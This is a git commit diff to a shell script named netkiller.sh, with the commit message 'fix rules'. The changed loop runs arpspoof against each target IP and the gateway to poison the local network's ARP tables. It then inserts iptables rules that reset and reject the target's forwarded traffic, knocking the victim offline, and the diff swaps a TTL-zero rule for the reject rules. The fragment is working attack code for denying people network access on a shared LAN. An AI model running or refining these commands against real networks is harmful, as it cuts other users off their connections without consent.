0a6c6f820e870c63b020d4fd4ac5840bfcef841f
rff ald <117867334+xiv3r@users.noreply.github.com>
2025-10-02 18:50:34 +0800

    fix rules

--- netkiller.sh
+++ netkiller.sh
@@ -234,9 +234,8 @@ for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
      PIDS+=($!)
-     iptables -t mangle -I FORWARD 1 -s "$TARGET" -j TTL --ttl-set 0
-     iptables -I FORWARD 2 -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
-     iptables -I FORWARD 3 -s "$TARGET" -j REJECT --reject-with icmp-host-unreachable
+     iptables -I FORWARD 1 -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
+     iptables -I FORWARD 2 -s "$TARGET" -j REJECT --reject-with icmp-host-unreachable
 done
 
 echo " "
